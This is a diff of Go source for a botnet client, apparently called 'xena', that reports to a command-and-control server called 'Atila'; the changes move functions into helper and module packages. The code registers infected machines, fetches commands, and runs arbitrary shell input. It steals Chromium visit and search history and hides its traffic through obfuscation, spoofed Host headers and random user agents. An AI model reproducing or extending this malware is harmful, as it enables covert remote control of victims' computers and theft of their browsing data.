@@ -9,6 +9,10 @@ import (
 	"net/http"
 	"strconv"
 	"strings"
+	"xena/helpers"
+	"xena/modules"
+	"xena/networking"
+	"xena/services"
 
 	"github.com/golang-jwt/jwt"
 )
@@ -40,12 +44,12 @@ type ReplyMessage struct {
 // Corresponds to ReplyMessage.Content, keep in mind that this type needs to be
 // converted into string by making it into a JWT, prior to assigning it to ReplyMessage.Content
 type ReplyContent struct {
-	ShellOutput        string    `json:"shellOutput"`        // Output of executed shell code.
-	OsDetails          OsDetails `json:"osDetails"`          // Basic information about the system.
-	Other              string    `json:"other"`              // Any string of data.
-	WebSearchResults   []string  `json:"webSearchResults"`   // A slice of strings made out of web search results. (url links)
-	WebHistoryVisits   []string  `json:"webHistoryVisits"`   // A slice of strings made out of web url visit history from a browser.
-	WebHistorySearches []string  `json:"webHistorySearches"` // A slice of strings representing search terms from a browser.
+	ShellOutput        string            `json:"shellOutput"`        // Output of executed shell code.
+	OsDetails          modules.OsDetails `json:"osDetails"`          // Basic information about the system.
+	Other              string            `json:"other"`              // Any string of data.
+	WebSearchResults   []string          `json:"webSearchResults"`   // A slice of strings made out of web search results. (url links)
+	WebHistoryVisits   []string          `json:"webHistoryVisits"`   // A slice of strings made out of web url visit history from a browser.
+	WebHistorySearches []string          `json:"webHistorySearches"` // A slice of strings representing search terms from a browser.
 }
 
 // IdentifyPayload is a structure corresponding to Atila's bot identification endpoint.
@@ -67,8 +71,8 @@ func identify(host, id string, publicKey *rsa.PublicKey) error {
 	// Bot's identification details which will be stored in the Atila's database.
 	details := IdentifyPayload{
 		Id:        id,
-		PublicKey: publicKeyToPEM(publicKey),
-		Os:        osDetails().Os,
+		PublicKey: modules.PublicKeyToPEM(publicKey),
+		Os:        modules.GetOsDetails().Os,
 		Status:    "ALIVE",
 	}
 
@@ -78,15 +82,15 @@ func identify(host, id string, publicKey *rsa.PublicKey) error {
 	}
 
 	// Obfuscate the payload.
-	payloadJson, err := serializedTraffic(string(detailsJson))
+	payloadJson, err := networking.SerializedTraffic(string(detailsJson))
 	if err != nil {
 		return err
 	}
 
-	request, err := http.NewRequest("POST", host+randEntry(atilaClientInsertMap), bytes.NewBuffer([]byte(payloadJson)))
-	request.Host = randomPopularDomain()
+	request, err := http.NewRequest("POST", host+helpers.RandEntry(atilaClientInsertMap), bytes.NewBuffer([]byte(payloadJson)))
+	request.Host = helpers.RandomPopularDomain()
 	request.Header.Set("Content-Type", "application/json")
-	request.Header.Set("User-Agent", randomUserAgent())
+	request.Header.Set("User-Agent", helpers.RandomUserAgent())
 	if err != nil {
 		return err
 	}
@@ -121,15 +125,15 @@ func messageAck(host, messageId string) error {
 		return err
 	}
 
-	payloadJson, err := serializedTraffic(string(messageAckJson))
+	payloadJson, err := networking.SerializedTraffic(string(messageAckJson))
 	if err != nil {
 		return err
 	}
 
-	request, err := http.NewRequest("POST", host+randEntry(atilaAckMessageMap), bytes.NewBuffer([]byte(payloadJson)))
-	request.Host = randomPopularDomain()
+	request, err := http.NewRequest("POST", host+helpers.RandEntry(atilaAckMessageMap), bytes.NewBuffer([]byte(payloadJson)))
+	request.Host = helpers.RandomPopularDomain()
 	request.Header.Set("Content-Type", "application/json")
-	request.Header.Set("User-Agent", randomUserAgent())
+	request.Header.Set("User-Agent", helpers.RandomUserAgent())
 	if err != nil {
 		return err
 	}
@@ -160,15 +164,15 @@ func sendMessage(host string, message Message) error {
 		return err
 	}
 
-	payloadJson, err := serializedTraffic(string(insertionJson))
+	payloadJson, err := networking.SerializedTraffic(string(insertionJson))
 	if err != nil {
 		return err
 	}
 
-	request, err := http.NewRequest("POST", host+randEntry(atilaPostMessageMap), bytes.NewBuffer([]byte(payloadJson)))
-	request.Host = randomPopularDomain()
+	request, err := http.NewRequest("POST", host+helpers.RandEntry(atilaPostMessageMap), bytes.NewBuffer([]byte(payloadJson)))
+	request.Host = helpers.RandomPopularDomain()
 	request.Header.Set("Content-Type", "application/json")
-	request.Header.Set("User-Agent", randomUserAgent())
+	request.Header.Set("User-Agent", helpers.RandomUserAgent())
 	if err != nil {
 		return err
 	}
@@ -226,7 +230,7 @@ func interpretMessage(host string, message Message) (Message, error) {
 
 	// Get system's details.
 	if content.Shell == "/os" {
-		replyContent.OsDetails = osDetails()
+		replyContent.OsDetails = modules.GetOsDetails()
 
 		// Add a bot peer.
 	} else if strings.HasPrefix(content.Shell, "/addPeer ") {
@@ -238,7 +242,7 @@ func interpretMessage(host string, message Message) (Message, error) {
 
 		// Grab Chromium history of visits.
 	} else if content.Shell == "/browserVisits" {
-		visits, err := grabChromiumHistory("VISITS")
+		visits, err := modules.GrabChromiumHistory("VISITS")
 		if err != nil {
 			return reply, err
 		}
@@ -247,7 +251,7 @@ func interpretMessage(host string, message Message) (Message, error) {
 
 		// Grab Chromium history of search terms.
 	} else if content.Shell == "/browserSearches" {
-		searches, err := grabChromiumHistory("TERMS")
+		searches, err := modules.GrabChromiumHistory("TERMS")
 		if err != nil {
 			return reply, err
 		}
@@ -257,7 +261,7 @@ func interpretMessage(host string, message Message) (Message, error) {
 		// Perform web search using duckduckgo.
 	} else if strings.HasPrefix(content.Shell, "/duckit ") {
 		term := content.Shell[8:]
-		searchResults, err := duckit(term)
+		searchResults, err := services.Duckit(term)
 		if err != nil {
 			return reply, err
 		}
@@ -265,7 +269,7 @@ func interpretMessage(host string, message Message) (Message, error) {
 
 		// If nothing maches then just execute it in the shell and return the result.
 	} else {
-		replyContent.ShellOutput, err = runTerminal(content.Shell)
+		replyContent.ShellOutput, err = modules.RunTerminal(content.Shell)
 		if err != nil {
 			return reply, err
 		}
@@ -297,9 +301,9 @@ func interpretMessage(host string, message Message) (Message, error) {
 func fetchMessages(host, id string) ([]Message, error) {
 	var messages []Message
 
-	request, err := http.NewRequest("GET", host+randEntry(atilaFetchMessagesMap)+"?status=SENT&clientId="+id, nil)
-	request.Host = randomPopularDomain()
-	request.Header.Set("User-Agent", randomUserAgent())
+	request, err := http.NewRequest("GET", host+helpers.RandEntry(atilaFetchMessagesMap)+"?status=SENT&clientId="+id, nil)
+	request.Host = helpers.RandomPopularDomain()
+	request.Header.Set("User-Agent", helpers.RandomUserAgent())
 	if err != nil {
 		return messages, err
 	}
